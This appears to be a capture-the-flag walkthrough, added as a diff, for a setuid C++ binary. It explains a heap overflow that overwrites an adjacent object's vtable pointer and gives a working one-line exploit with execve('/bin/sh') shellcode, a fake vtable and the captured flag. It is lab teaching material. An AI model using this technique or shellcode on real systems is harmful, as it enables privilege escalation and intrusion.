@@ -1,0 +1,78 @@
+# Level9 Walkthrough
+
+Binary is setuid `bonus0`. It is a C++ program with a class `N`:
+
+```cpp
+class N {
+  char annotation[100];
+  int number;
+public:
+  N(int n) { number = n; }
+  void setAnnotation(char *s) { memcpy(annotation, s, strlen(s)); }
+  virtual int operator+(N &r) { return number + r.number; }
+  virtual int operator-(N &r) { return number - r.number; }
+};
+
+int main(int argc, char **argv) {
+  if (argc <= 1)
+    _exit(1);
+  N *a = new N(5);
+  N *b = new N(6);
+  a->setAnnotation(argv[1]);
+  return (*b + *a);
+}
+```
+
+## Vulnerability
+
+Because `N` has virtual functions, every object starts with a hidden pointer to its
+vtable (the table of its virtual functions). The object layout is:
+
+```
+offset 0   : vtable pointer (4 bytes)
+offset 4   : char annotation[100]
+offset 104 : int number
+```
+
+`setAnnotation` copies `argv[1]` with `memcpy(annotation, s, strlen(s))` and no bound
+check -> heap overflow. `a` and `b` are two consecutive heap blocks (`b` is 112 bytes
+after `a`: 108-byte object + 4-byte malloc header), so overflowing `a`'s annotation
+overwrites the vtable pointer at the start of `b`.
+
+`*b + *a` calls `operator+` through `b`'s vtable pointer. The call dereferences twice:
+`b -> vtable pointer -> vtable[0] -> call`. Controlling `b`'s vtable pointer gives
+control of the jump target.
+
+## Exploitation
+
+Put shellcode in the buffer (heap is executable, NX disabled, ASLR off) and craft a
+fake vtable so the call lands on it.
+
+- `a` = `0x0804a008`, so the annotation buffer `A` = `0x0804a00c`.
+- Shellcode placed at `A + 4` = `0x0804a010`.
+- `b`'s vtable pointer sits at buffer offset 108 (`b = a + 112`).
+
+Buffer layout:
+
+```
+[ A+4 = shellcode address ] [ shellcode ] [ padding ] [ A = fake vtable at buffer start ]
+```
+
+At runtime: `b`'s vtable pointer = `A`, so `vtable[0]` is read from `A` = `0x0804a010`,
+and `call` jumps to the shellcode.
+
+```sh
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*(108-4-21) + "\x0c\xa0\x04\x08"')
+```
+
+- `\x10\xa0\x04\x08`: shellcode address (`0x0804a010`), the value the fake vtable returns.
+- shellcode: `execve("/bin/sh")`, 21 bytes.
+- `"A"*(108-4-21)`: padding to reach `b`'s vtable pointer (offset 108, minus the 4-byte
+  address and the 21-byte shellcode).
+- `\x0c\xa0\x04\x08`: new vtable pointer for `b` = buffer start (`0x0804a00c`).
+
+Flag:
+
+```txt
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
